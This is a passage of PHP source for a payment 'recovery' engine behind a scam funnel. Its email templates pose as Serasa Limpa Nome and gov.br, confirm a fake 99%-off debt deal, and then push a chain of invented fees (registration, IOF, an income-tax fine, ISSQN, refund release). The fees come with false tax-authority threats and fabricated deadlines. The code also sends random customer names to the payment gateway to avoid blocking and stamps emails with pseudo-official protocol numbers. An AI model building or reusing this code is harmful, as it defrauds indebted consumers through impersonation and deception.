<?php
/**
 * =============================================================================
 * MOTOR DE RECUPERACAO DE PIX — biblioteca central
 * =============================================================================
 * Responsavel por:
 *   1. Registrar cada PIX gerado (SQLite local em .private/recovery.sqlite)
 *   2. Marcar transacoes como pagas (webhook/polling)
 *   3. Gerar tokens seguros (HMAC) para os links de recuperacao
 *   4. Enviar e-mails via SMTP (implementacao propria, sem dependencias)
 *   5. Montar os templates dos 3 e-mails de recuperacao
 *
 * TODAS as funcoes sao defensivas: qualquer falha aqui NUNCA pode quebrar o
 * checkout. Os pontos de integracao no api_proxy.php usam try/catch.
 *
 * Requisitos: PHP 7+ com pdo_sqlite (padrao no aaPanel) e sockets habilitados.
 */

if (!defined('RECOVERY_LIB_LOADED')) {
    define('RECOVERY_LIB_LOADED', 1);

// -----------------------------------------------------------------------------
// CONFIG (lida do .env via env_get, com defaults seguros)
// -----------------------------------------------------------------------------
function recovery_cfg($key, $default = '') {
    $v = function_exists('env_get') ? env_get($key) : (function_exists('getenv') ? @getenv($key) : false);
    if ($v === false || $v === null || $v === '') return $default;
    return $v;
}

/** Segredo para assinar os links de recuperacao (HMAC). */
function recovery_secret() {
    $s = recovery_cfg('RECOVERY_SECRET', '');
    if ($s === '') $s = recovery_cfg('GENESYS_WEBHOOK_SECRET', '');
    if ($s === '') $s = 'troque-este-segredo-no-env'; // fallback (configure!)
    return $s;
}

/** Token HMAC de um txid — vai no link do e-mail (?t=TXID&k=TOKEN). */
function recovery_token($txid) {
    return substr(hash_hmac('sha256', (string)$txid, recovery_secret()), 0, 24);
}

function recovery_token_valid($txid, $token) {
    if (!is_string($token) || $token === '') return false;
    return hash_equals(recovery_token($txid), $token);
}

/** URL base publica do funil (ex.: https://seudominio.com). */
function recovery_base_url() {
    $u = rtrim(recovery_cfg('RECOVERY_BASE_URL', ''), '/');
    if ($u !== '') return $u;
    // fallback: host atual (funciona quando chamado via web)
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    if ($host !== '') {
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        return $scheme . '://' . $host;
    }
    return '';
}

// -----------------------------------------------------------------------------
// BANCO (SQLite)
// -----------------------------------------------------------------------------
function recovery_db() {
    static $pdo = null;
    static $failed = false;
    if ($failed) return null;
    if ($pdo !== null) return $pdo;
    if (!class_exists('PDO') || !in_array('sqlite', PDO::getAvailableDrivers(), true)) {
        $failed = true;
        @error_log('[recovery] pdo_sqlite indisponivel — recuperacao desativada.');
        return null;
    }
    try {
        $file = __DIR__ . '/recovery.sqlite';
        $pdo = new PDO('sqlite:' . $file);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->exec('PRAGMA journal_mode=WAL');
        $pdo->exec('PRAGMA busy_timeout=5000');
        $pdo->exec('CREATE TABLE IF NOT EXISTS transactions (
            txid          TEXT PRIMARY KEY,
            identifier    TEXT,
            product_type  TEXT,
            amount        REAL,
            status        TEXT DEFAULT "PENDING",
            name          TEXT,
            email         TEXT,
            phone         TEXT,
            document      TEXT,
            pix_code      TEXT,
            pix_qr        TEXT,
            emails_sent   INTEGER DEFAULT 0,
            last_email_at INTEGER,
            created_at    INTEGER,
            paid_at       TEXT
        )');
        $pdo->exec('CREATE INDEX IF NOT EXISTS idx_status_type ON transactions(status, product_type)');
        $pdo->exec('CREATE INDEX IF NOT EXISTS idx_identifier ON transactions(identifier)');
        // Coluna NOVA (idempotente): controla o envio do e-mail do ENTREGAVEL
        // (confirmacao do acordo) apos pagamento do front (acordo).
        try { $pdo->exec('ALTER TABLE transactions ADD COLUMN deliverable_sent INTEGER DEFAULT 0'); } catch (\Throwable $e) { /* ja existe */ }
        // Coluna NOVA (idempotente, zip 75): UTMs do PIX (json) para que um pedido
        // reconstruido do banco (quando o order_<txid>.json sumiu) chegue na
        // UTMify COM atribuicao — antes ia sem UTM ("nao trackeada").
        try { $pdo->exec('ALTER TABLE transactions ADD COLUMN utm_json TEXT'); } catch (\Throwable $e) { /* ja existe */ }
        // Controle de envios da recuperacao de UPSELLS (1 registro por e-mail+etapa).
        // Tabela NOVA criada automaticamente — nao mexe em dados existentes.
        $pdo->exec('CREATE TABLE IF NOT EXISTS upsell_emails (
            email         TEXT,
            stage         TEXT,
            emails_sent   INTEGER DEFAULT 0,
            last_email_at INTEGER,
            created_at    INTEGER,
            PRIMARY KEY (email, stage)
        )');
        return $pdo;
    } catch (\Throwable $e) {
        $failed = true;
        @error_log('[recovery] erro ao abrir sqlite: ' . $e->getMessage());
        return null;
    }
}

/** Registra um PIX recem-criado. Chamado pelo api_proxy (create_pix). */
function recovery_record($txid, $payload, $pixCode, $pixQr) {
    $db = recovery_db();
    if (!$db || !$txid) return;
    $client = isset($payload['client']) && is_array($payload['client']) ? $payload['client'] : array();
    // Dados REAIS do cliente (capturados no inicio do funil) tem prioridade.
    // O client.name do payload e um nome aleatorio gerado so para o gateway
    // (anti-bloqueio) — NAO deve aparecer nos e-mails de recuperacao.
    $realName  = isset($payload['realName']) ? trim((string)$payload['realName']) : '';
    $nameToUse = ($realName !== '') ? $realName : (isset($client['name']) ? (string)$client['name'] : '');
    // E-mail: se a chave realEmail existir, usa SOMENTE ela (vazia = sem e-mail
    // real capturado -> cron pula, evitando envio para e-mail derivado/ficticio).
    if (array_key_exists('realEmail', $payload)) {
        $emailToUse = strtolower(trim((string)$payload['realEmail']));
    } else {
        $emailToUse = isset($client['email']) ? strtolower(trim((string)$client['email'])) : '';
    }
    $utmJson = recovery_utm_json_from_payload($payload);
    $st = $db->prepare('INSERT OR IGNORE INTO transactions
        (txid, identifier, product_type, amount, status, name, email, phone, document, pix_code, pix_qr, created_at, utm_json)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)');
    $st->execute(array(
        (string)$txid,
        isset($payload['identifier']) ? (string)$payload['identifier'] : '',
        isset($payload['productType']) ? strtolower(trim((string)$payload['productType'])) : '',
        isset($payload['amount']) ? (float)$payload['amount'] : 0,
        'PENDING',
        $nameToUse,
        $emailToUse,
        isset($client['phone']) ? (string)$client['phone'] : '',
        isset($client['document']) ? (string)$client['document'] : '',
        (string)$pixCode,
        (string)$pixQr,
        time(),
        $utmJson
    ));
    // BACKFILL das UTMs se a row ja existia sem elas (nao-fatal).
    if ($utmJson !== null) {
        try {
            $up = $db->prepare('UPDATE transactions SET utm_json=? WHERE txid=? AND (utm_json IS NULL OR utm_json="")');
            $up->execute(array($utmJson, (string)$txid));
        } catch (\Throwable $e) { /* nao-fatal */ }
    }
    // BACKFILL: se a row ja existia (INSERT ignorado) SEM e-mail e agora temos um
    // e-mail real valido, atualiza — destrava o entregavel/recuperacao dessa tx.
    if ($emailToUse !== '' && filter_var($emailToUse, FILTER_VALIDATE_EMAIL)) {
        try {
            $up = $db->prepare('UPDATE transactions SET email=? WHERE txid=? AND (email IS NULL OR email="")');
            $up->execute(array($emailToUse, (string)$txid));
        } catch (\Throwable $e) { /* nao-fatal */ }
    }
}

/** Marca como pago por qualquer identificador conhecido (txid ou identifier). */
function recovery_mark_paid($identifiers, $paidAt) {
    $db = recovery_db();
    if (!$db) return;
    if (!is_array($identifiers)) $identifiers = array($identifiers);
    $paidAt = $paidAt ? (string)$paidAt : date('c');
    foreach ($identifiers as $id) {
        $id = (string)$id;
        if ($id === '') continue;
        $st = $db->prepare('UPDATE transactions SET status="PAID", paid_at=? WHERE (txid=? OR identifier=?) AND status<>"PAID"');
        $st->execute(array($paidAt, $id, $id));
    }
    // ENTREGAVEL: quem pagou o FRONT (acordo) recebe o e-mail de acesso ao
    // confirmacao do acordo. Idempotente via deliverable_sent;
    // nunca pode travar o webhook/polling (try/catch).
    try { recovery_send_deliverable_for_identifiers($identifiers); } catch (\Throwable $e) { @error_log('[recovery] deliverable: ' . $e->getMessage()); }
}

// -----------------------------------------------------------------------------
// ENTREGAVEL — e-mail de confirmacao/termo do acordo apos pagamento do front
// -----------------------------------------------------------------------------
/** URL publica do entregavel (portal do acordo). Se vazia, o e-mail nao leva botao de acesso. */
function recovery_deliverable_url() {
    $u = rtrim(recovery_cfg('DELIVERABLE_URL', ''), '/');
    return $u;
}

/**
 * Envia o e-mail do entregavel para as transacoes de FRONT (acordo) PAGAS
 * que ainda nao receberam (deliverable_sent=0) e que tem e-mail REAL.
 * Chamado automaticamente por recovery_mark_paid e pelo cron (backstop).
 */
function recovery_send_deliverable_for_identifiers($identifiers) {
    $db = recovery_db();
    if (!$db) return 0;
    if (!is_array($identifiers)) $identifiers = array($identifiers);
    $sent = 0;
    foreach ($identifiers as $id) {
        $id = (string)$id;
        if ($id === '') continue;
        $st = $db->prepare('SELECT * FROM transactions
            WHERE (txid=? OR identifier=?) AND status="PAID" AND product_type="acordo"
              AND COALESCE(deliverable_sent,0)=0 AND email<>"" LIMIT 1');
        $st->execute(array($id, $id));
        $row = $st->fetch(PDO::FETCH_ASSOC);
        if (!$row) continue;
        if (recovery_send_deliverable_row($row)) $sent++;
    }
    return $sent;
}

/** Envia o e-mail do entregavel para UMA linha; marca a flag so apos envio OK. */
function recovery_send_deliverable_row($row) {
    $db = recovery_db();
    if (!$db || empty($row['email'])) return false;
    $mail = recovery_build_deliverable_email($row);
    $err = null;
    $ok = recovery_send_mail($row['email'], $row['name'], $mail['subject'], $mail['html'], $err);
    if ($ok) {
        $st = $db->prepare('UPDATE transactions SET deliverable_sent=1 WHERE txid=?');
        $st->execute(array((string)$row['txid']));
    } else {
        @error_log('[recovery] falha ao enviar entregavel txid=' . $row['txid'] . ' err=' . $err);
    }
    return (bool)$ok;
}

/**
 * E-mail do ENTREGAVEL: confirmacao do pagamento do acordo (99% de desconto)
 * + protocolo + proximos passos (registro/homologacao). Tom transacional gov.br.
 */
function recovery_build_deliverable_email($row) {
    $nome  = recovery_first_name($row['name']);
    $email = trim((string)$row['email']);
    $url   = recovery_deliverable_url();
    $proto = strtoupper(substr(preg_replace('/[^A-Za-z0-9]/', '', (string)$row['txid']), 0, 8));
    $valor = recovery_fmt_brl($row['amount']);

    $subject   = $nome . ', pagamento confirmado — seu acordo foi ativado (' . $proto . ')';
    $preheader = 'Recebemos o pagamento do seu acordo com 99% de desconto. Guarde este protocolo.';

    $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#168821">PAGAMENTO CONFIRMADO</b></div>'
        . '<h2 style="font-size:18px;color:#0C326F;margin:0 0 10px">' . htmlspecialchars($nome) . ', seu acordo foi ativado ✅</h2>'
        . '<p style="font-size:14px;color:#3f3f46;line-height:1.6;margin:0 0 8px">Recebemos a confirmação do pagamento de <b>' . $valor . '</b> referente ao seu acordo com <b>99% de desconto</b> pelo Serasa Limpa Nome.</p>'
        . '<p style="font-size:14px;color:#3f3f46;line-height:1.6;margin:0 0 8px">A solicitação de baixa das dívidas foi encaminhada aos credores. O <b>registro de quitação</b> e a <b>homologação</b> do acordo seguem o fluxo oficial — você será avisado neste mesmo e-mail (' . htmlspecialchars($email) . ') a cada etapa.</p>'
        . ($url !== '' ? recovery_cta($url, 'ACESSAR MEU ACORDO') : '')
        . '<div style="background:#eef4ff;border:1px solid #bcd3ff;border-radius:10px;padding:12px 14px;margin:14px 0">'
        . '<p style="font-size:13px;color:#3f3f46;line-height:1.6;margin:0"><b>Importante:</b> guarde o protocolo <b>' . $proto . '</b>. Ele identifica o seu acordo em qualquer consulta ou pendência futura.</p>'
        . '</div>'
        . '<p style="font-size:12px;color:#71717a;line-height:1.6;margin:10px 0 0">Este e-mail é uma confirmação automática. Se restar alguma etapa pendente, você receberá um aviso separado.</p>';

    return array('subject' => $subject, 'html' => recovery_email_shell($inner, $preheader));
}

/**
 * Cadeia COMPLETA do funil, na ordem em que o cliente avanca.
 * Usada pelo cron para descobrir em qual etapa cada cliente parou.
 */
function recovery_stage_chain() {
    return array('acordo', 'registro', 'adm', 'iof', 'multa_ir', 'issqn', 'verificacao',
                 'liberacao', 'chave_pix', 'ted', 'certidao', 'cadastro', 'seguro',
                 'prioridade', 'imposto_ress', 'biometria', 'encerramento');
}

/**
 * Extrai as UTMs do payload do create_pix (utm / trackProps / tracking /
 * metadata) e devolve um JSON so com chaves de atribuicao, ou null se vazio.
 */
function recovery_utm_json_from_payload($payload) {
    if (!is_array($payload)) return null;
    $allow = array('utm_source','utm_medium','utm_campaign','utm_content','utm_term','utm_id',
                   'src','sck','fbclid','fbc','fbp','gclid','ttclid','xcod');
    $out = array();
    foreach (array('utm', 'trackProps', 'tracking', 'metadata') as $k) {
        if (!isset($payload[$k]) || !is_array($payload[$k])) continue;
        foreach ($payload[$k] as $kk => $vv) {
            $kk = (string)$kk;
            if (!is_scalar($vv)) continue;
            $vv = trim((string)$vv);
            if ($vv === '') continue;
            $norm = $kk;
            // o SPA manda utm:{source,medium,campaign,content,term}
            if ($k === 'utm' && in_array($kk, array('source','medium','campaign','content','term','id'), true)) $norm = 'utm_' . $kk;
            if (!in_array($norm, $allow, true)) continue;
            if (!isset($out[$norm])) $out[$norm] = $vv;
        }
    }
    if (!$out) return null;
    $j = json_encode($out, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $j === false ? null : $j;
}

/**
 * Busca UMA transacao por qualquer id conhecido (txid OU identifier).
 * Usado para achar o txid CANONICO antes de falar com a UTMify — evita que o
 * mesmo pagamento vire 2 pedidos (um por txid, outro por identifier/externalId).
 */
function recovery_find_any($ids) {
    $db = recovery_db();
    if (!$db) return null;
    if (!is_array($ids)) $ids = array($ids);
    $clean = array();
    foreach ($ids as $id) { $id = trim((string)$id); if ($id !== '') $clean[$id] = true; }
    $clean = array_keys($clean);
    if (!$clean) return null;
    $ph = implode(',', array_fill(0, count($clean), '?'));
    try {
        // 1) txid tem prioridade (e a chave canonica do pedido na UTMify)
        $st = $db->prepare("SELECT * FROM transactions WHERE txid IN ($ph) ORDER BY created_at DESC LIMIT 1");
        $st->execute($clean);
        $row = $st->fetch(PDO::FETCH_ASSOC);
        if ($row) return $row;
        // 2) identifier (CNH-xxxx / externalId) — unico por PIX
        $st = $db->prepare("SELECT * FROM transactions WHERE identifier IN ($ph) ORDER BY created_at DESC LIMIT 1");
        $st->execute($clean);
        $row = $st->fetch(PDO::FETCH_ASSOC);
        return $row ?: null;
    } catch (\Throwable $e) { return null; }
}

/** Busca uma transacao pelo txid. */
function recovery_get($txid) {
    $db = recovery_db();
    if (!$db) return null;
    $st = $db->prepare('SELECT * FROM transactions WHERE txid=? LIMIT 1');
    $st->execute(array((string)$txid));
    $row = $st->fetch(PDO::FETCH_ASSOC);
    return $row ?: null;
}

// -----------------------------------------------------------------------------
// SMTP MAILER (puro PHP, sem dependencias) — suporta SSL (465) e STARTTLS (587)
// -----------------------------------------------------------------------------
function recovery_send_mail($toEmail, $toName, $subject, $html, &$err = null) {
    $host   = recovery_cfg('SMTP_HOST');
    $port   = (int)recovery_cfg('SMTP_PORT', '465');
    $secure = strtolower(recovery_cfg('SMTP_SECURE', $port === 465 ? 'ssl' : 'tls')); // ssl|tls|none
    $user   = recovery_cfg('SMTP_USER');
    $pass   = recovery_cfg('SMTP_PASS');
    $from   = recovery_cfg('SMTP_FROM_EMAIL', $user);
    $fromNm = recovery_cfg('SMTP_FROM_NAME', 'Central de Entregas');

    if ($host === '' || $user === '' || $pass === '' || $from === '') {
        $err = 'SMTP nao configurado (SMTP_HOST/SMTP_USER/SMTP_PASS no .env)';
        return false;
    }
    if (!filter_var($toEmail, FILTER_VALIDATE_EMAIL)) { $err = 'destinatario invalido'; return false; }

    $remote = ($secure === 'ssl' ? 'ssl://' : '') . $host . ':' . $port;
    $ctx = stream_context_create(array('ssl' => array('verify_peer' => true, 'verify_peer_name' => true, 'SNI_enabled' => true)));
    $fp = @stream_socket_client($remote, $errno, $errstr, 20, STREAM_CLIENT_CONNECT, $ctx);
    if (!$fp) { $err = 'conexao SMTP falhou: ' . $errstr; return false; }
    stream_set_timeout($fp, 20);

    $read = function () use ($fp) {
        $data = '';
        while (($line = fgets($fp, 515)) !== false) {
            $data .= $line;
            if (strlen($line) < 4 || $line[3] !== '-') break;
        }
        return $data;
    };
    $cmd = function ($c, $expect) use ($fp, $read, &$err) {
        if ($c !== null) fwrite($fp, $c . "\r\n");
        $r = $read();
        if ((int)substr($r, 0, 3) !== $expect) { $err = 'SMTP: esperado ' . $expect . ', recebido: ' . trim($r); return false; }
        return true;
    };

    if (!$cmd(null, 220)) { fclose($fp); return false; }
    if (!$cmd('EHLO ' . $host, 250)) { fclose($fp); return false; }
    if ($secure === 'tls') {
        if (!$cmd('STARTTLS', 220)) { fclose($fp); return false; }
        if (!@stream_socket_enable_crypto($fp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) { $err = 'STARTTLS falhou'; fclose($fp); return false; }
        if (!$cmd('EHLO ' . $host, 250)) { fclose($fp); return false; }
    }
    if (!$cmd('AUTH LOGIN', 334)) { fclose($fp); return false; }
    if (!$cmd(base64_encode($user), 334)) { fclose($fp); return false; }
    if (!$cmd(base64_encode($pass), 235)) { fclose($fp); return false; }
    if (!$cmd('MAIL FROM:<' . $from . '>', 250)) { fclose($fp); return false; }
    if (!$cmd('RCPT TO:<' . $toEmail . '>', 250)) { fclose($fp); return false; }
    if (!$cmd('DATA', 354)) { fclose($fp); return false; }

    $encName = function ($n) { return '=?UTF-8?B?' . base64_encode($n) . '?='; };
    $headers  = 'From: ' . $encName($fromNm) . ' <' . $from . ">\r\n";
    $headers .= 'To: ' . ($toName ? $encName($toName) . ' ' : '') . '<' . $toEmail . ">\r\n";
    $headers .= 'Subject: ' . $encName($subject) . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "Content-Transfer-Encoding: base64\r\n";
    $headers .= 'Date: ' . date('r') . "\r\n";
    $headers .= 'Message-ID: <' . uniqid('rec', true) . '@' . $host . ">\r\n";
    $body = chunk_split(base64_encode($html));
    // protecao dot-stuffing
    $data = $headers . "\r\n" . $body;
    $data = preg_replace('/^\./m', '..', $data);
    fwrite($fp, $data . "\r\n.\r\n");
    $ok = $cmd(null, 250);
    fwrite($fp, "QUIT\r\n");
    fclose($fp);
    return $ok;
}

// -----------------------------------------------------------------------------
// TEMPLATES DE E-MAIL (azul gov.br / Desenrola, mobile-first, inline CSS)
// -----------------------------------------------------------------------------
function recovery_email_shell($inner, $preheader = '') {
    // Preheader: texto invisivel de pre-visualizacao (aumenta taxa de abertura).
    $pre = '';
    if ($preheader !== '') {
        $pre = '<div style="display:none;max-height:0;overflow:hidden;opacity:0;color:#f4f4f5;font-size:1px;line-height:1px">'
            . htmlspecialchars($preheader, ENT_QUOTES)
            . str_repeat('&#847;&zwnj;&nbsp;', 60) . '</div>';
    }
    return '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>'
        . '<body style="margin:0;padding:0;background:#f3f5f9;font-family:Arial,Helvetica,sans-serif">'
        . $pre
        . '<div style="max-width:480px;margin:0 auto;padding:16px">'
        . '<div style="background:#0C326F;border-radius:16px 16px 0 0;padding:18px;text-align:center;border-bottom:4px solid #FFCD07">'
        . '<span style="color:#fff;font-size:22px;font-weight:900;letter-spacing:1px">' . htmlspecialchars(recovery_cfg('OFFER_NAME', 'SERASA LIMPA NOME')) . '</span>'
        . '<div style="color:#bcd3ff;font-size:11px;margin-top:2px">Programa de Renegociação de Dívidas — Central de Acordos</div>'
        . '</div>'
        . '<div style="background:#ffffff;border-radius:0 0 16px 16px;padding:24px 20px">' . $inner . '</div>'
        . '<p style="text-align:center;font-size:10px;color:#a1a1aa;margin-top:14px">Você recebeu este e-mail porque iniciou uma renegociação pelo programa.<br>Se já concluiu o pagamento, desconsidere esta mensagem.</p>'
        . '</div></body></html>';
}

function recovery_first_name($name) {
    $name = trim((string)$name);
    if ($name === '') return 'Cidadão';
    $parts = preg_split('/\s+/', $name);
    $first = function_exists('mb_strtolower') ? mb_strtolower($parts[0], 'UTF-8') : strtolower($parts[0]);
    return function_exists('mb_convert_case') ? mb_convert_case($first, MB_CASE_TITLE, 'UTF-8') : ucfirst($first);
}

function recovery_fmt_brl($v) {
    return 'R$ ' . number_format((float)$v, 2, ',', '.');
}

function recovery_cta($url, $label) {
    return '<div style="text-align:center;margin:22px 0">'
        . '<a href="' . htmlspecialchars($url, ENT_QUOTES) . '" style="display:inline-block;background:#1351B4;color:#ffffff;text-decoration:none;font-weight:800;font-size:15px;padding:15px 28px;border-radius:30px">' . $label . '</a></div>';
}

function recovery_pix_block($pixCode) {
    if (!$pixCode) return '';
    return '<p style="font-size:12px;color:#71717a;margin:18px 0 6px;text-align:center;font-weight:bold">OU copie o código PIX abaixo e pague direto no app do seu banco:</p>'
        . '<div style="background:#f4f4f5;border:1px dashed #d4d4d8;border-radius:10px;padding:12px;font-size:11px;color:#52525b;word-break:break-all;font-family:monospace">' . htmlspecialchars($pixCode, ENT_QUOTES) . '</div>';
}

/**
 * Monta assunto+html do e-mail N (1, 2 ou 3) para uma transacao do ACORDO (front).
 *
 * COPY focada em CLIQUE:
 *   - Assunto curto, pessoal, tom de notificacao transacional (sem cara de promo)
 *   - CTA logo no inicio do corpo (antes da dobra)
 *   - Motivo concreto + prazo explicito + consequencia real de nao agir
 */
function recovery_build_email($n, $row) {
    $nome  = recovery_first_name($row['name']);
    $valor = recovery_fmt_brl($row['amount']);
    $base  = recovery_base_url();
    $tok   = recovery_token($row['txid']);
    $link  = $base . '/recuperar/?t=' . rawurlencode($row['txid']) . '&k=' . $tok;

    // Protocolo pseudo-oficial (credibilidade/transacional) derivado do txid.
    $proto = strtoupper(substr(preg_replace('/[^A-Za-z0-9]/', '', (string)$row['txid']), 0, 8));
    if ($n === 1) {
        $subject = $nome . ', seu acordo com 99% de desconto está reservado — falta o pagamento (' . $proto . ')';
        $preheader = 'Seu acordo já foi gerado no seu CPF. Falta confirmar o pagamento para a baixa das dívidas ser solicitada.';
        $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#d97706">AGUARDANDO PAGAMENTO</b></div>'
            . '<h2 style="font-size:18px;color:#0C326F;margin:0 0 10px">' . htmlspecialchars($nome) . ', seu acordo está reservado no seu CPF</h2>'
            . '<p style="font-size:14px;color:#3f3f46;line-height:1.6">O único passo que falta é a confirmação do pagamento de <b style="color:#1351B4">' . $valor . '</b> (acordo com <b>99% de desconto</b>). Enquanto o sistema não identifica o pagamento, a <b>baixa das dívidas não é solicitada</b> e o seu nome continua com restrição.</p>'
            . recovery_cta($link, 'CONFIRMAR MEU ACORDO AGORA →')
            . '<div style="background:#fff8e1;border:1px solid #ffe08a;border-radius:10px;padding:12px;margin:14px 0">'
            . '<p style="font-size:13px;color:#7a5a00;margin:0;line-height:1.5"><b>Prazo:</b> a condição de 99% fica reservada por tempo limitado. Sem a confirmação, o acordo é <b>cancelado automaticamente</b> e as dívidas voltam ao valor integral.</p></div>'
            . '<p style="font-size:12px;color:#168821;margin:8px 0 0;text-align:center;font-weight:bold">✔ Milhares de brasileiros já quitaram suas dívidas pelo programa esta semana</p>'
            . recovery_pix_block($row['pix_code'])
            . '<p style="font-size:12px;color:#71717a;margin-top:14px;line-height:1.5">O pagamento é via PIX e a confirmação é imediata — em segundos a baixa é solicitada aos credores.</p>';
    } elseif ($n === 2) {
        $subject = '⚠ ' . $nome . ', o cancelamento do seu acordo já foi agendado';
        $preheader = 'O sistema agendou o cancelamento automático do seu acordo de 99%. Ainda dá tempo de impedir.';
        $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#dc2626">CANCELAMENTO AGENDADO</b></div>'
            . '<h2 style="font-size:18px;color:#dc2626;margin:0 0 10px">Seu acordo entrou na lista de cancelamento</h2>'
            . '<p style="font-size:14px;color:#3f3f46;line-height:1.6">' . htmlspecialchars($nome) . ', o pagamento de <b>' . $valor . '</b> continua pendente e o sistema já <b style="color:#dc2626">agendou o cancelamento automático</b> do seu acordo. Depois disso, <b>não há como reverter</b> a condição de 99%.</p>'
            . recovery_cta($link, 'IMPEDIR O CANCELAMENTO AGORA →')
            . '<div style="background:#fef2f2;border:1px solid #fecaca;border-radius:10px;padding:14px;margin:14px 0">'
            . '<p style="font-size:13px;color:#991b1b;margin:0;line-height:1.5"><b>O que você perde ao cancelar:</b> as dívidas voltam ao valor integral, o seu CPF sai desta rodada do programa e a restrição permanece nos órgãos de proteção ao crédito. <b>É definitivo.</b></p></div>'
            . recovery_pix_block($row['pix_code'])
            . '<p style="font-size:12px;color:#71717a;margin-top:14px">Se você já pagou nos últimos minutos, desconsidere — a confirmação pode levar alguns instantes.</p>';
    } else {
        $desc = (float)recovery_cfg('RECOVERY_DISCOUNT_PRICE', '34.90');
        $descFmt = recovery_fmt_brl($desc);
        $linkD = $link . '&d=1';
        $subject = '🔓 ' . $nome . ', liberamos seu acordo por ' . $descFmt . ' — só até hoje';
        $preheader = 'Redução única autorizada no valor do acordo. Depois de hoje a reserva é cancelada.';
        $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#dc2626">ÚLTIMO AVISO</b></div>'
            . '<h2 style="font-size:18px;color:#0C326F;margin:0 0 10px">Última chance antes do cancelamento definitivo</h2>'
            . '<p style="font-size:14px;color:#3f3f46;line-height:1.6">' . htmlspecialchars($nome) . ', como você chegou até a etapa final, a central liberou uma <b style="color:#168821">redução única no valor do acordo</b> — válida somente hoje. É a última tentativa antes de o seu CPF sair do programa:</p>'
            . '<div style="background:#f0fdf4;border:2px solid #168821;border-radius:12px;padding:16px;text-align:center;margin:16px 0">'
            . '<div style="font-size:12px;color:#71717a;margin-bottom:2px">De <span style="text-decoration:line-through">' . $valor . '</span> por apenas</div>'
            . '<span style="font-size:28px;color:#168821;font-weight:900">' . $descFmt . '</span>'
            . '<div style="font-size:11px;color:#15803d;margin-top:4px;font-weight:bold">Depois de hoje, o acordo é cancelado e o desconto perde a validade</div></div>'
            . recovery_cta($linkD, 'USAR MEU DESCONTO AGORA →')
            . '<p style="font-size:12px;color:#71717a;margin-top:14px">Após o pagamento, a baixa das dívidas é solicitada imediatamente. Esta é a última mensagem que você recebe sobre este acordo.</p>';
    }
    return array('subject' => $subject, 'html' => recovery_email_shell($inner, isset($preheader) ? $preheader : ''));
}

/**
 * E-mails de recuperacao de UPSELL — copy tematica por etapa do funil.
 *
 * $n    = 1 (primeiro aviso) ou 2 (ultimatum)
 * $slug = etapa-alvo que o cliente NAO pagou (registro, adm, ...)
 * $row  = transacao PAGA da etapa ANTERIOR (fonte de nome/txid p/ token)
 * $link = URL completa da pagina do upsell com ?src=email&t=..&k=..
 *
 * A copy gera urgencia/medo LIGADOS ao tema da pagina de destino — sem citar
 * valores (a pagina mostra o preco). CTA no topo do corpo.
 */
function recovery_build_upsell_email($n, $slug, $row, $link) {
    $nome = recovery_first_name($row['name']);

    // [titulo-curto, problema (e-mail 1), consequencia-final (e-mail 2), rotulo do CTA]
    $map = array(
        'registro' => array(
            'Registro de quitação pendente',
            'o seu acordo foi pago, mas a <b>taxa de registro e homologação</b> ainda não foi confirmada. Sem o registro, a quitação <b>não é comunicada aos órgãos de proteção ao crédito</b> e o seu nome continua com restrição.',
            'o acordo será <b>mantido como não registrado</b>, as restrições cadastrais permanecem e as condições obtidas (99% de desconto) serão <b>canceladas</b>.',
            'CONCLUIR MEU REGISTRO →'
        ),
        'adm' => array(
            'Taxas administrativas pendentes',
            'o Documento de Arrecadação com as <b>taxas administrativas</b> (emissão do termo, processamento, homologação e autenticação digital) está em aberto. Enquanto não é pago, o termo do acordo <b>não é emitido</b>.',
            'o termo do acordo <b>não será emitido</b> e o processo de quitação será <b>arquivado sem efeito</b>, mesmo com o valor principal já pago.',
            'PAGAR AS TAXAS E EMITIR O TERMO →'
        ),
        'iof' => array(
            'IOF de efetivação do contrato pendente',
            'a Receita Federal registrou a pendência do <b>IOF de efetivação do contrato</b> do seu acordo. Enquanto o imposto não é recolhido, o contrato fica <b>sem validade jurídica</b>.',
            'o contrato do acordo será considerado <b>não efetivado</b> e a pendência de IOF seguirá para <b>cobrança com multa</b>.',
            'RECOLHER O IOF AGORA →'
        ),
        'multa_ir' => array(
            'Multa de IR não declarado',
            'na análise do seu CPF foram identificados <b>exercícios de Imposto de Renda não declarados</b>. A multa precisa ser regularizada para que a Receita libere a baixa do acordo.',
            'o CPF será mantido em situação <b>pendente de regularização</b> na Receita Federal e a liberação do acordo ficará <b>bloqueada por tempo indeterminado</b>.',
            'REGULARIZAR MEU IR →'
        ),
        'issqn' => array(
            'ISSQN sobre a prestação de serviço',
            'a prestação de serviço do acordo gerou um <b>ISSQN em aberto</b> junto ao município. É a última guia tributária antes da finalização do processo.',
            'o processo será devolvido para <b>reanálise fiscal</b> e todas as etapas já pagas ficarão <b>suspensas</b>.',
            'PAGAR O ISSQN E FINALIZAR →'
        ),
        'verificacao' => array(
            'Ressarcimento aguardando verificação',
            'o sistema apurou valores de <b>ressarcimento a seu favor</b>, mas a <b>taxa de verificação</b> ainda não foi confirmada. Sem ela, o valor <b>não é liberado para o seu PIX</b>.',
            'o ressarcimento será <b>cancelado e devolvido ao Tesouro</b>, sem nova possibilidade de solicitação.',
            'LIBERAR MEU RESSARCIMENTO →'
        ),
        'liberacao' => array(
            'Liberação do ressarcimento pendente',
            'o seu ressarcimento foi aprovado e está <b>aguardando a taxa de liberação bancária</b>. Até a confirmação, o valor fica <b>retido na conta de trânsito</b>.',
